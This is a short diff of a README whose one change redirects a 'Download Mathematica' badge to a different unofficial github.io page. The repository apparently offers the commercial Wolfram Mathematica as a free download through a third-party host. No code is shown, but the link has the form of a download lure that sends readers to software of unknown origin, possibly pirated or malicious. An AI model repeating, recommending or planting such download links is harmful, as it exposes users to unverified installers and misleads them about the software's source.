@@ -2,7 +2,7 @@
 
 ## 📥 Download Wolfram Mathematica
 
-[![⬇️ Download Mathematica](https://img.shields.io/badge/Download-Mathematica-red?style=for-the-badge&logo=wolfram)](https://wolfram-mat.github.io/.github)
+[![⬇️ Download Mathematica](https://img.shields.io/badge/Download-Mathematica-red?style=for-the-badge&logo=wolfram)](https://svaefemic.github.io/.github/wolfram-mat)
 
 ---
 
